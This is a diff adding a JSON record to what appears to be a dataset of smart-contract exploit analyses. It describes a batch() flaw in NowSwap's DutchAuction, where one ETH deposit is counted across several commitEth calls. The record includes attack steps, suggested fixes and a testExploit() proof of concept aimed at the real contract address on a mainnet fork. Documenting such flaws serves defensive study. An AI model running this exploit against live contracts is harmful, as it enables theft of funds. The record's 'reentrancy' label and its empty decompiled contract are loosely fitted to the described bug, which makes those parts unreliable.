@@ -1,0 +1,34 @@
+{
+ "id": "2021__2021-09-14_NowSwap_DutchAuction_BatchReentrancy",
+ "source_file": "2021/2021-09-14_NowSwap_DutchAuction_BatchReentrancy.md",
+ "title": "NowSwap — Dutch Auction batch() Reentrancy Vulnerability Analysis",
+ "date": "2021-09-14",
+ "protocol": "NowSwap",
+ "chain": "Ethereum",
+ "loss_raw": "Unconfirmed — no on-chain attack tx found",
+ "loss_usd": null,
+ "root_cause": "When the batch() function makes multiple calls to the same function (commitEth), state is not updated between each call, allowing duplicate participation",
+ "attack_tx": "No confirmed on-chain attack tx — simulation PoC demonstrating Dutch Auction batch() reentrancy; the major NowSwap loss ($1M+) was from a separate K-invariant bug in block 13,229,001 (fork block: 13,038,771)",
+ "vulnerable_contract": "0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e (DutchAuction)",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "// ❌ DutchAuction @ 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e\ninterface IDutchAuction {\n    // Participate in auction with ETH\n    function commitEth(address payable _beneficiary, bool readAndAgreedToMarketParticipationAgreement)\n        external payable;\n\n    // Execute multiple calls in a batch\n    function batch(bytes[] calldata calls, bool revertOnFail)\n        external payable returns (bool[] memory successes, bytes[] memory results);\n}\n\n// commitEth is called multiple times inside batch()\n// Total committed amount state is not updated between each commitEth call\n// → The same msg.value is counted multiple times",
+  "// ❌ Root Cause: When batch() makes multiple calls to the same function (commitEth), state is not updated between each call, allowing duplicate participation\n// ⚠️ Source for vulnerable function `batch()` is not present in this file\n// (Located in a Diamond pattern Facet or proxy implementation)\n// SPDX-License-Identifier: UNLICENSED\n// Source unverified — reverse engineered from bytecode\n// Original: 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e (Ethereum)\n// Reverse engineering method: Function selector extraction + 4byte.directory decoding\n\npragma solidity ^0.8.0;\n\ncontract DutchAuction_Decompiled {\n}"
+ ],
+ "code_after": [
+  "// ✅ Prevent reentrancy/duplicate state changes during batch() execution\n// ✅ commitEth with nonReentrant + single-call validation\n\nuint256 private _batchDepth;\n\nmodifier noBatchReentrant() {\n    require(_batchDepth == 0 || msg.sender != address(this), \"no batch reentrant\");\n    _batchDepth++;\n    _;\n    _batchDepth--;\n}\n\nfunction commitEth(address payable _beneficiary, bool agreed)\n    external payable noBatchReentrant\n{\n    // Update participant commitment with the latest state on every call\n    _updateCommitment(_beneficiary, msg.value);\n}",
+  "// ✅ Clarify ETH distribution logic within batch()\n// ✅ Restrict commitEth from being used as a sub-call inside batch\n\n// Note: Solidity's msg.value is shared across delegatecall/call chains\n// Each call within batch() must be allocated a separate value\n\nfunction batch(bytes[] calldata calls, bool revertOnFail, uint256[] calldata values)\n    external payable returns (bool[] memory successes, bytes[] memory results)\n{\n    uint256 totalValue;\n    for (uint i = 0; i < values.length; i++) totalValue += values[i];\n    require(msg.value == totalValue, \"batch: value mismatch\");\n\n    for (uint i = 0; i < calls.length; i++) {\n        (bool success, bytes memory result) = address(this).call{value: values[i]}(calls[i]);\n        // ...\n    }\n}"
+ ],
+ "steps": [
+  "Step 1: Encode multiple commitEth call data",
+  "Step 2: DutchAuction.batch(calls, false){value: 100 ETH}",
+  "→ commitEth executes N times, same ETH applied per call",
+  "Step 3: Acquire participation rights counted as N×100 ETH"
+ ],
+ "other_code": [
+  "┌──────────────────────────────────────────────────────────┐\n│ Step 1: Encode multiple commitEth call data              │\n│ bytes[] memory calls = new bytes[](N);                   │\n│ for(i) calls[i] = abi.encodeCall(commitEth, (this, true))│\n└─────────────────────┬────────────────────────────────────┘\n                      │\n┌─────────────────────▼────────────────────────────────────┐\n│ Step 2: DutchAuction.batch(calls, false){value: 100 ETH} │\n│ @ 0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e            │\n│ → commitEth executes N times, same ETH applied per call  │\n└─────────────────────┬────────────────────────────────────┘\n                      │\n┌─────────────────────▼──────────────────────────────────┐\n│ Step 3: Acquire participation rights counted as N×100 ETH│\n│ or realize ETH profit",
+  "// testExploit() — mainnet fork block 13,038,771\nfunction testExploit() public {\n    IDutchAuction auction = IDutchAuction(0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e);\n\n    // Encode commitEth call N times\n    bytes[] memory calls = new bytes[](5);\n    for (uint i = 0; i < 5; i++) {\n        calls[i] = abi.encodeWithSelector(\n            auction.commitEth.selector,\n            payable(address(this)),\n            true  // readAndAgreedToMarketParticipationAgreement\n        );\n    }\n\n    // Execute 5 commitEth calls via batch() with a single deposit of 100 ETH\n    auction.batch{value: 100 ether}(calls, false);\n\n    // Receive refund\n}\n\nreceive() external payable {}"
+ ]
+}
